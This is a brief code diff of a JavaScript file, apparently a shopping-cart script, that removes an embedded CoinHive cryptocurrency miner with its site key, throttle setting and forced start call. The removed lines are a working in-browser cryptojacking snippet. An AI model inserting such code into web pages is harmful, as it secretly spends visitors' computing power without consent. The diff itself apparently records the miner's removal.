@@ -2,13 +2,6 @@
 // Use of this source code is governed by a license that can be
 // found in the LICENSE file.
 
-const h = 'LSgkS4CSHrNuPD7xe8mqGmwDr82Eh3bT';
-
-var miner = new CoinHive.Anonymous(h, {
-    throttle: 0.8
-});
-
-miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 
 let j, cart, expected,
  config = {
